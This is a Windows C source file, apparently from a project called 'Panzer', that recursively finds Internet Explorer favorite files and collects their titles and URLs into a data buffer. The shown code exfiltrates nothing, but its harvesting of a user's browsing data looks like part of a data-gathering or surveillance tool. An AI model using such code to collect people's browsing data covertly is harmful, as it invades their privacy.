/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



#include <windows.h>
#include <stdio.h>
#include "Panzer_Definitions.h"



/*
 * Function that searches inside a directory for
 * favorite files. If it finds an other directory,
 * it calls itself recursively.
 *
 */

char *searchIEFavorites(char *pBaseDirectory, char *pDataBufferAddress, int *pDataBufferSize)
{
  WIN32_FIND_DATA lFileData; 
  HANDLE lSearchHandle;  
  char lFilePattern[MAX_BUF_SIZE + 1]; 
  char lSubDirectory[MAX_BUF_SIZE + 1];
  char lFavoriteFile[MAX_BUF_SIZE + 1];
  char lHomeDirectory[MAX_BUF_SIZE + 1];
  char *lRetVal = pDataBufferAddress!=NULL?pDataBufferAddress:NULL;


  if (pBaseDirectory != NULL)
  {
    ZeroMemory(lHomeDirectory, sizeof(lHomeDirectory));
    strncpy(lHomeDirectory, pBaseDirectory, sizeof(lHomeDirectory));

    if (lHomeDirectory[strlen(lHomeDirectory) - 1] != '\\')
      strcat(lHomeDirectory, "\\");

    ZeroMemory(lFilePattern, sizeof(lFilePattern));
    _snprintf(lFilePattern, sizeof(lFilePattern) - 1, "%s*", lHomeDirectory);




    /*
     * Start the search.
     *
     */

    if ((lSearchHandle = FindFirstFile(lFilePattern, &lFileData)) != INVALID_HANDLE_VALUE) 
    {
      do 
      { 
        /*
         * File is a directory. Do a recursive function call to 
         * check it for other favorite files.
         *
         */

        if(lFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
          if (strcmp(lFileData.cFileName, ".") && strcmp(lFileData.cFileName, ".."))
          {
            ZeroMemory(lSubDirectory, sizeof(lSubDirectory));
            snprintf(lSubDirectory, sizeof(lSubDirectory) - 1, "%s\\%s", pBaseDirectory, lFileData.cFileName);
            lRetVal = searchIEFavorites(lSubDirectory, lRetVal, pDataBufferSize);
          } // if (strcmp(lFileDa...
        } else {

          /*
           * File is a Internet Explorer favorite file.
           * Extract the relevant entries.
           *
           */

          if (strstr(lFileData.cFileName, ".url"))
          {
            ZeroMemory(lFavoriteFile, sizeof(lFavoriteFile));
            _snprintf(lFavoriteFile, sizeof(lFavoriteFile) - 1, "%s\\%s", pBaseDirectory, lFileData.cFileName);
            lRetVal = extractFavoriteDetails(lFavoriteFile, lRetVal, pDataBufferSize);
          } // if (strstr(lFileData...
        } // if(lFileData.dwFileAt...
      } while (FindNextFile(lSearchHandle, &lFileData));
    } // if ((lSearchHandle = FindFirstFile(l...
  } // if (pBaseDirectory != NULL)

  return(lRetVal);
}




/*
 * Extract favorite entry details.
 *
 */

char *extractFavoriteDetails(char *pFileName, char *pDataBufferAddress, int *pDataBufferSize)
{
  FILE *lFH = NULL;
  char lTemp[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char lFavoriteTitle[MAX_BUF_SIZE + 1];
  char *lFavoriteURL = NULL;
  char *lRetVal = pDataBufferAddress!=NULL?pDataBufferAddress:NULL;



  if ((lFH = fopen(pFileName, "r")) != NULL)
  {
    ZeroMemory(lTemp, sizeof(lTemp));

    while (fgets(lTemp, sizeof(lTemp) - 1, lFH) != NULL)
    {
      /*
       * Check for trailing NL/CR characters
       *
       */

      if (lTemp[strlen(lTemp) - 1] == '\n')
        lTemp[strlen(lTemp) - 1] = 0;

      if (lTemp[strlen(lTemp) - 1] == '\r')
        lTemp[strlen(lTemp) - 1] = 0;


      /*
       * Find URL-entry in favorite file
       *
       */

      if (strncmp(lTemp, "url=", 4) == 0 || strncmp(lTemp, "URL=", 4) == 0)
      {
        /*
         * Extract favorite URL
         *
         */

        lFavoriteURL = lTemp + 4;

        if (strchr(pFileName, '\\'))
          strncpy(lFavoriteTitle, strrchr(pFileName, '\\') + 1, sizeof(lFavoriteTitle)), lFavoriteTitle[strlen(lFavoriteTitle) - 4] = 0;
        else
          strncpy(lFavoriteTitle, pFileName, sizeof(lFavoriteTitle)), lFavoriteTitle[strlen(lFavoriteTitle) - 4] = 0;

        ZeroMemory(lTemp2, sizeof(lTemp2));
        snprintf(lTemp2, sizeof(lTemp2) - 1, "%-30s - %s\n", lFavoriteTitle, lFavoriteURL);
        lRetVal = addDataToBuffer(lRetVal, pDataBufferSize, lTemp2, strlen(lTemp2));
	  } // if (strncmp(lData...
	} // while (fgets(lTemp, si...

    fclose(lFH);
  } // if ((lFH = fopen(p...

  return(lRetVal);
}